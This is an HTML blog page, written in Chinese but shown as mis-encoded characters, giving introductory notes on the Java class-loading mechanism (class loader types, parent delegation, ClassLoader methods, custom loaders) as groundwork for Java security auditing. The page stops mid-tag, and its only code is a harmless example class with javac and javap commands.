<!-- build time:Thu Jan 18 2024 13:01:15 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="ä½™æ˜Ÿé…’" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Javaä»£ç å®¡è®¡,Javaå®‰å…¨åŸºç¡€ç¯‡"><link rel="canonical" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"><title>1. javaç±»åŠ è½½æœºåˆ¶ - Javaå®‰å…¨åŸºç¡€ - ä»£ç å®¡è®¡ | ä½™æ˜Ÿé…’ = ä½™æ˜Ÿé…’ = ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">1. javaç±»åŠ è½½æœºåˆ¶</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2023-07-16 20:43:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2023-07-16T20:43:00+08:00">2023-07-16</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ä½™æ˜Ÿé…’</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicliwyw55j20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipevuctzzj20zk0m84qp.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="item" rel="index" title="åˆ†ç±»äº ä»£ç å®¡è®¡"><span itemprop="name">ä»£ç å®¡è®¡</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" itemprop="item" rel="index" title="åˆ†ç±»äº Javaå®‰å…¨åŸºç¡€"><span itemprop="name">Javaå®‰å…¨åŸºç¡€</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ä½™æ˜Ÿé…’"><meta itemprop="description" content="ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸, æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ä½™æ˜Ÿé…’"></span><div class="body md" itemprop="articleBody"><h1 id="ç±»åŠ è½½æœºåˆ¶"><a href="#ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="ç±»åŠ è½½æœºåˆ¶"></a>ç±»åŠ è½½æœºåˆ¶</h1><p>Javaæ–‡ä»¶é€šè¿‡ç¼–è¯‘å™¨å˜æˆäº†.classæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥ç±»åŠ è½½å™¨æœ‰åˆå°†è¿™äº›.classæ–‡ä»¶åŠ è½½åˆ°JVMä¸­ï¼Œå…¶ä¸­ç±»è£…è½½å™¨çš„ä½œç”¨å°±æ˜¯ç±»çš„åŠ è½½</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230715174731029.png" title="image-20230715174731029"><p><img data-src="/./../Images/image-20230715175006520.png" alt="image-20230715175006520"></p><p>å½“è¿è¡ŒæŸä¸ªç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°è¿™ä¸ªç±»è¿˜æ²¡æœ‰è¢«åŠ è½½ï¼Œé‚£ä¹ˆå°±ä¼šå¦‚ä¸Šè¿‡ç¨‹è¿›è¡ŒåŠ è½½</p><p>Java ç¨‹åºæ˜¯ç”± class æ–‡ä»¶ç»„æˆçš„ä¸€ä¸ªå®Œæ•´çš„åº”ç”¨ç¨‹åºï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„ class æ–‡ä»¶è¿›å…¥å†…å­˜ï¼Œè€Œæ˜¯é€šè¿‡ Java çš„ç±»åŠ è½½æœºåˆ¶ï¼ˆClassLoaderï¼‰è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œä»è€Œè½¬æ¢æˆ java.lang.Class ç±»çš„ä¸€ä¸ªå®ä¾‹</p><h2 id="ç±»åŠ è½½å™¨çš„ç§ç±»"><a href="#ç±»åŠ è½½å™¨çš„ç§ç±»" class="headerlink" title="ç±»åŠ è½½å™¨çš„ç§ç±»"></a>ç±»åŠ è½½å™¨çš„ç§ç±»</h2><h3 id="Bootstarp-ClassLoader"><a href="#Bootstarp-ClassLoader" class="headerlink" title="Bootstarp ClassLoader"></a>Bootstarp ClassLoader</h3><blockquote><p>å¯åŠ¨ç±»åŠ è½½å™¨ : è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£å°†ä¸€äº›æ ¸å¿ƒçš„ã€è¢«JVMè¯†åˆ«çš„ç±»åŠ è½½è¿›æ¥ï¼Œç”¨C++å®ç°ï¼Œä¸JVMä¸€ä½“çš„ï¼Œ<code>æ˜¯æ— æ³•ç›´æ¥è·å–åˆ°çš„</code></p></blockquote><h3 id="Extension-ClassLoader"><a href="#Extension-ClassLoader" class="headerlink" title="Extension ClassLoader"></a>Extension ClassLoader</h3><blockquote><p>æ‰©å±•ç±»åŠ è½½å™¨ : è¿™ä¸ªç±»åŠ è½½å™¨ç”¨æ¥åŠ è½½ Java çš„æ‰©å±•åº“ï¼Œå…¶ç›®å½•åœ¨<code>jre\lib\ext</code></p></blockquote><h3 id="Application-ClassLoader"><a href="#Application-ClassLoader" class="headerlink" title="Application ClassLoader"></a>Application ClassLoader</h3><blockquote><p>Appç±»åŠ è½½å™¨&#x2F;ç³»ç»Ÿç±»åŠ è½½å™¨ : ç”¨äºåŠ è½½æˆ‘ä»¬è‡ªå·±å®šä¹‰ç¼–å†™çš„ç±»</p></blockquote><h3 id="User-ClassLoader"><a href="#User-ClassLoader" class="headerlink" title="User ClassLoader"></a>User ClassLoader</h3><blockquote><p>ç”¨æˆ·è‡ªå·±å®ç°çš„åŠ è½½å™¨ : å½“å®é™…éœ€è¦è‡ªå·±æŒæ§ç±»åŠ è½½è¿‡ç¨‹æ—¶æ‰ä¼šç”¨åˆ°ï¼Œä¸€èˆ¬æ²¡æœ‰ç”¨åˆ°</p></blockquote><blockquote><p>å¯åŠ¨ç±»åŠ è½½å™¨</p></blockquote><p>ClassLoader æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯<code>é€šè¿‡æŒ‡å®šçš„ç±»çš„åç§°ï¼Œæ‰¾åˆ°æˆ–ç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç ï¼Œè¿”å›ä¸€ä¸ª java.lang.Class ç±»çš„å®ä¾‹</code>ï¼Œå¯ä»¥ç»§æ‰¿ ClassLoader ç±»æ¥å®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>getParent()</td><td>è¿”å›è¯¥ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨</td></tr><tr><td>loadClass(String name)</td><td>åŠ è½½åç§°ä¸º name çš„ç±»ï¼Œè¿”å›ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹</td></tr><tr><td>findClass(String name)</td><td>æŸ¥æ‰¾åç§°ä¸º name çš„ç±»ï¼Œè¿”å›ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹</td></tr><tr><td>findLoadedClass(String name)</td><td>æŸ¥æ‰¾åç§°ä¸º name çš„å·²ç»è¢«åŠ è½½è¿‡çš„ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹</td></tr><tr><td>defindClas(String name, byte[] b, int off, int len)</td><td>æŠŠå­—èŠ‚æ•°ç»„ b ä¸­çš„å†…å®¹è½¬ä¸ºjavaç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹ï¼Œè¯¥æ–¹æ³•è¢«å£°æ˜ä¸ºfinal</td></tr><tr><td>resolvClass(Class&lt;?&gt; c)</td><td>é“¾æ¥æŒ‡å®šçš„ Java ç±»</td></tr></tbody></table><h2 id="åŒäº²å§”æ‰˜æœºåˆ¶"><a href="#åŒäº²å§”æ‰˜æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ‰˜æœºåˆ¶"></a>åŒäº²å§”æ‰˜æœºåˆ¶</h2><p>å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€å±‚æ¬¡çš„ç±»åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„åŠ è½½è¯·æ±‚æœ€ç»ˆéƒ½åº”è¯¥ä¼ é€åˆ°é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ä¸­ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚æ—¶ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€è¦çš„ç±»ï¼‰ï¼Œå­åŠ è½½å™¨æ‰ä¼šèˆ±å®¤è‡ªå·±å»åŠ è½½</p><ol><li>é¦–å…ˆï¼Œæ£€æŸ¥è¯·æ±‚çš„ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡äº†</li><li>æœªåŠ è½½ï¼Œåˆ™è¯·æ±‚çˆ¶ç±»åŠ è½½å™¨å»åŠ è½½å¯¹åº”è·¯å¾„ä¸‹çš„ç±»</li><li>å¦‚æœåŠ è½½ä¸åˆ°ï¼Œæ‰ç”±ä¸‹é¢çš„å­ç±»ä¾æ¬¡å»åŠ è½½</li></ol><blockquote><p>java.lang.String -&gt; æœ¬åœ°åŠ è½½å™¨ -&gt; æ‰©å±•åŠ è½½å™¨ -&gt; æ ¹ï¼ˆé¡¶å±‚ï¼‰åŠ è½½å™¨</p></blockquote><h1 id="ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰"><a href="#ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰" class="headerlink" title="ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰"></a>ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰</h1><p>Java æ˜¯ä¸€ä¸ªä¾èµ–äº <code>JVM</code>ï¼ˆJava è™šæ‹Ÿæœºï¼‰å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€</p><p>Java ç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆ <code>classæ–‡ä»¶</code>ï¼ŒJava ç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ <code>java.lang.ClassLoader</code> åŠ è½½ç±»å­—èŠ‚ç ï¼Œ<code>ClassLoader</code> ä¼šè°ƒç”¨ JVM çš„ native æ–¹æ³•ï¼ˆ<code>defineClass0/1/2</code>ï¼‰æ¥å®šä¹‰ä¸€ä¸ª <code>java.lang.Class</code> å®ä¾‹</p><p><strong>JVM æ¶æ„å›¾</strong></p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230715205505718.png" title="image-20230715205505718"><h1 id="Javaç±»"><a href="#Javaç±»" class="headerlink" title="Javaç±»"></a>Javaç±»</h1><p>Java æ˜¯ç¼–è¯‘å‹è¯­è¨€ï¼Œæˆ‘ä»¬ç¼–å†™çš„ java æ–‡ä»¶éœ€è¦ç¼–è¯‘æˆå class æ–‡ä»¶åæ‰èƒ½å¤Ÿè¢« JVM è¿è¡Œ</p><pre><code class="java">package com.liangc.classloader;

public class IndexJava &#123;
    public String test() &#123;
        return &quot;this is test, the code is ok ! &quot;;
    &#125;
&#125;
</code></pre><ol><li>å¯ä»¥é€šè¿‡ <code>javac</code> è¿›è¡Œç¼–è¯‘<code>javac IndexJava.java =&gt; IndexJava.class</code></li><li>å¯ä»¥é€šè¿‡ <code>JDK</code> è‡ªå¸¦çš„ <code>javap</code> å‘½ä»¤åæ±‡ç¼– <code>javap -c -p -l IndexJava.class</code></li></ol><p>JVM åœ¨æ‰§è¡Œ <code>IndexJava</code> ä¹‹å‰ä¼šå…ˆè§£æ class äºŒè¿›åˆ¶å†…å®¹ï¼ŒJVM æ‰§è¡Œçš„å…¶å®å°±æ˜¯å¦‚ä¸Š <code>javap</code> å‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç ã€‚</p><h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><ol><li><p>ä¸€åˆ‡çš„ Java ç±»éƒ½å¿…é¡»ç»è¿‡ JVM åŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€Œ <code>ClassLoader</code> çš„ä¸»è¦ä½œç”¨å°±æ˜¯ Java ç±»æ–‡ä»¶çš„åŠ è½½</p></li><li><p>åœ¨ JVM ç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯ <code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼Œè¯¥ç±»åŠ è½½å™¨å®ç°äº JVM å±‚ï¼Œé‡‡ç”¨ C++ ç¼–å†™ï¼‰</code>ã€<code>Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰</code>ã€<code>App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰</code></p></li><li><p><code>AppClassLoader</code> æ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨ <code>AppClassLoader</code> åŠ è½½ç±»</p></li><li><p>é€šè¿‡<code>ClassLoader.getSystemClassLoader()</code> å¯ä»¥è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ <code>sun.misc.Launcher$AppClassLoader@18b4aac2</code></p></li></ol><blockquote><p>æŸäº›æ—¶å€™æˆ‘ä»¬è·å–ä¸€ä¸ªç±»çš„ç±»åŠ è½½å™¨æ—¶å€™å¯èƒ½ä¼šè¿”å›ä¸€ä¸ª <code>null</code> å€¼ï¼Œå¦‚:<code>java.io.File.class.getClassLoader()</code> å°†è¿”å›ä¸€ä¸ª <code>null</code> å¯¹è±¡ï¼Œå› ä¸º <code>java.io.File</code> ç±»åœ¨ JVM åˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢« <code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</code> åŠ è½½ï¼Œæˆ‘ä»¬åœ¨å°è¯•è·å–è¢« <code>Bootstrap ClassLoader</code> ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ <code>ClassLoader</code> æ—¶å€™éƒ½ä¼šè¿”å› <code>null</code></p></blockquote><p><code>ClassLoader</code> ç±»æœ‰å¦‚ä¸‹æ ¸å¿ƒæ–¹æ³•ï¼š</p><ol><li><code>loadClass()</code>ï¼ˆåŠ è½½æŒ‡å®šçš„ Java ç±»ï¼‰</li><li><code>findClass()</code>ï¼ˆæŸ¥æ‰¾æŒ‡å®šçš„ Java ç±»ï¼‰</li><li><code>findLoadedClass()</code>ï¼ˆæŸ¥æ‰¾ JVM å·²ç»åŠ è½½è¿‡çš„ç±»ï¼‰</li><li><code>defineClass()</code>ï¼ˆå®šä¹‰ä¸€ä¸ª Java ç±»ï¼‰</li><li><code>resolveClass()</code>ï¼ˆé“¾æ¥æŒ‡å®šçš„ Java ç±»ï¼‰</li></ol><h1 id="Java-ç±»åŠ¨æ€åŠ è½½æ–¹å¼"><a href="#Java-ç±»åŠ¨æ€åŠ è½½æ–¹å¼" class="headerlink" title="Java ç±»åŠ¨æ€åŠ è½½æ–¹å¼"></a>Java ç±»åŠ¨æ€åŠ è½½æ–¹å¼</h1><p>Java ç±»åŠ è½½æ–¹å¼åˆ†ä¸º <code>æ˜¾å¼</code> å’Œ <code>éšå¼</code></p><p><code>æ˜¾å¼</code> å³æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>Javaåå°„</code> æˆ–è€… <code>ClassLoader</code> æ¥åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»å¯¹è±¡</p><p><code>éšå¼</code> æŒ‡çš„æ˜¯ <code>ç±»å.æ–¹æ³•å()</code> æˆ– <code>new</code> ç±»å®ä¾‹</p><p><code>æ˜¾å¼</code> ç±»åŠ è½½æ–¹å¼ä¹Ÿå¯ä»¥ç†è§£ä¸ºç±»åŠ¨æ€åŠ è½½ï¼Œå¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»åŠ è½½ä»»æ„çš„ç±»</p><p><strong>å¸¸ç”¨çš„ç±»åŠ¨æ€åŠ è½½æ–¹å¼</strong></p><pre><code class="java">// åå°„åŠ è½½IndexClassç¤ºä¾‹
Class.forName(&quot;com.liangc.classloader.IndexJava&quot;);
</code></pre><pre><code class="java">// ClassLoaderåŠ è½½TestHelloWorldç¤ºä¾‹
this.getClass().getClassLoader().loadClass(&quot;com.liangc.classloader.IndexJava&quot;);
</code></pre><p><code>Class.forName(&quot;ç±»å&quot;)</code> é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•, å¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨ <code>Class.forName(&quot;ç±»å&quot;, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</code>ï¼Œè€Œ <code>ClassLoader.loadClass</code> é»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•</p><h1 id="ClassLoader-ç±»åŠ è½½æµç¨‹"><a href="#ClassLoader-ç±»åŠ è½½æµç¨‹" class="headerlink" title="ClassLoader ç±»åŠ è½½æµç¨‹"></a>ClassLoader ç±»åŠ è½½æµç¨‹</h1><p><code>ClassLoader</code> åŠ è½½ <code>com.liangc.classloader.IndexJava</code> ç±»é‡è¦æµç¨‹</p><ol><li><code>ClassLoader</code> ä¼šè°ƒç”¨ <code>public Class&lt;?&gt; loadClass(String name)</code> æ–¹æ³•åŠ è½½ <code>com.liangc.classloader.IndexJava</code> ç±»</li><li>è°ƒç”¨ <code>findLoadedClass</code> æ–¹æ³•æ£€æŸ¥ <code>IndexJava</code> ç±»æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœ JVM å·²åˆå§‹åŒ–è¿‡è¯¥ç±»åˆ™ç›´æ¥è¿”å›ç±»å¯¹è±¡</li><li>å¦‚æœåˆ›å»ºå½“å‰ <code>ClassLoader</code> æ—¶ä¼ å…¥äº†çˆ¶ç±»åŠ è½½å™¨ï¼ˆ<code>new ClassLoader(çˆ¶ç±»åŠ è½½å™¨)</code>ï¼‰å°±ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½ <code>IndexJava</code> ç±»ï¼Œå¦åˆ™ä½¿ç”¨ JVM çš„ <code>Bootstrap ClassLoader</code> åŠ è½½</li><li>å¦‚æœä¸Šä¸€æ­¥æ— æ³•åŠ è½½ <code>IndexJava</code> ç±»ï¼Œé‚£ä¹ˆè°ƒç”¨è‡ªèº«çš„ <code>findClass</code> æ–¹æ³•å°è¯•åŠ è½½ <code>IndexJava</code> ç±»</li><li>å¦‚æœå½“å‰çš„ <code>ClassLoader</code> æ²¡æœ‰é‡å†™äº† <code>findClass</code> æ–¹æ³•ï¼Œé‚£ä¹ˆç›´æ¥è¿”å›ç±»åŠ è½½å¤±è´¥å¼‚å¸¸</li><li>å¦‚æœå½“å‰ç±»é‡å†™äº† <code>findClass</code> æ–¹æ³•å¹¶é€šè¿‡ä¼ å…¥çš„ <code>com.liangc.classloader.IndexJava</code> ç±»åæ‰¾åˆ°äº†å¯¹åº”çš„ç±»å­—èŠ‚ç ï¼Œé‚£ä¹ˆåº”è¯¥è°ƒç”¨ <code>defineClass</code> æ–¹æ³•å» JVM ä¸­æ³¨å†Œè¯¥ç±»</li><li>å¦‚æœè°ƒç”¨ loadClass çš„æ—¶å€™ä¼ å…¥çš„ <code>resolve</code> å‚æ•°ä¸º trueï¼Œé‚£ä¹ˆè¿˜éœ€è¦è°ƒç”¨ <code>resolveClass</code> æ–¹æ³•é“¾æ¥ç±»ï¼Œé»˜è®¤ä¸º false</li><li>è¿”å›ä¸€ä¸ªè¢« JVM åŠ è½½åçš„ <code>java.lang.Class</code> ç±»å¯¹è±¡</li></ol><h1 id="è‡ªå®šä¹‰-ClassLoader"><a href="#è‡ªå®šä¹‰-ClassLoader" class="headerlink" title="è‡ªå®šä¹‰ ClassLoader"></a>è‡ªå®šä¹‰ ClassLoader</h1><h3 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass()"></a>loadClass()</h3><p>loadClass() æ–¹æ³•å¯ä»¥åŠ è½½ç±»å¹¶è¿”å›ä¸€ä¸ª java.lang.Class ç±»å¯¹è±¡ï¼Œå½“ loadClass()æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œä¼šé¦–å…ˆä½¿ç”¨ findLoadedClass() æ–¹æ³•åˆ¤æ–­è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ï¼Œå¦‚æœæœªè¢«åŠ è½½ï¼Œåˆ™ä¼˜å…ˆä½¿ç”¨åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ã€‚å½“ä¸å­˜åœ¨çˆ¶ç±»åŠ è½½å™¨ï¼Œæ— æ³•å¯¹è¯¥ç±»è¿›è¡ŒåŠ è½½æ—¶ï¼Œåˆ™ä¼šè°ƒç”¨è‡ªèº«çš„ findClass() æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥é‡å†™ findClass()æ–¹æ³•æ¥å®Œæˆä¸€äº›ç±»åŠ è½½çš„ç‰¹æ®Šè¦æ±‚</p><h3 id="è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</h3><p>æ ¹æ® loadClass() æ–¹æ³•çš„æµç¨‹ï¼Œå¯ä»¥å‘ç°é€šè¿‡é‡å†™ findClass() æ–¹æ³•ï¼Œåˆ©ç”¨ defineClass() æ–¹æ³•æ¥å°†å­—èŠ‚ç è½¬æ¢æˆ java.lang.class ç±»å¯¹è±¡ï¼Œå°±å¯ä»¥å®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</p><p><code>java.lang.ClassLoader</code> æ˜¯æ‰€æœ‰çš„ç±»åŠ è½½å™¨çš„çˆ¶ç±»ï¼Œ<code>java.lang.ClassLoader</code> æœ‰éå¸¸å¤šçš„å­ç±»åŠ è½½å™¨ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨äºåŠ è½½ jar åŒ…çš„ <code>java.net.URLClassLoader</code> å…¶æœ¬èº«é€šè¿‡ç»§æ‰¿ <code>java.lang.ClassLoader</code> ç±»ï¼Œé‡å†™äº† <code>findClass</code> æ–¹æ³•ä»è€Œå®ç°äº†åŠ è½½ç›®å½• class æ–‡ä»¶ç”šè‡³æ˜¯è¿œç¨‹èµ„æºæ–‡ä»¶</p><p>ClassLoader å…·å¤‡äº†åŠ è½½ç±»çš„èƒ½åŠ›ï¼Œå¯ä»¥å°è¯•ä¸‹å†™ä¸€ä¸ªè‡ªå·±çš„ç±»åŠ è½½å™¨æ¥å®ç°åŠ è½½è‡ªå®šä¹‰çš„å­—èŠ‚ç ï¼ˆè¿™é‡Œä»¥åŠ è½½ <code>IndexJava</code> ç±»ä¸ºä¾‹ï¼‰å¹¶è°ƒç”¨ <code>test</code> æ–¹æ³•</p><p>å¦‚æœ <code>com.liangc.classloader.IndexJava</code> ç±»å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç å³å¯å®ç°è°ƒç”¨ <code>test</code> æ–¹æ³•å¹¶è¾“å‡º</p><pre><code 